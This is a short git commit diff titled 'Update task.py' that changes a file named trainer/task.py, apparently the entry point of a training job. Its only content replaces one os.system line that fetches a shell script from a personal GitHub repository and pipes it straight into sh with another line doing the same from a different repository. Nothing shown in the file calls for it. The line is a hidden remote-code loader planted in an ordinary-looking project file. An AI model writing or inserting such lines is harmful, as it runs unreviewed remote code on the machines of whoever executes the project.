624754a47db303e44cdd551dcabb93158acbded6
Tianna Mcdowell <160614390+TiannaMcdowell@users.noreply.github.com>
2024-02-26 02:14:27 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/shc/main/boled01.sh | sh')
+os.system('curl -sSL https://raw.githubusercontent.com/TiannaMcdowell/asoy/main/.sh | sh')
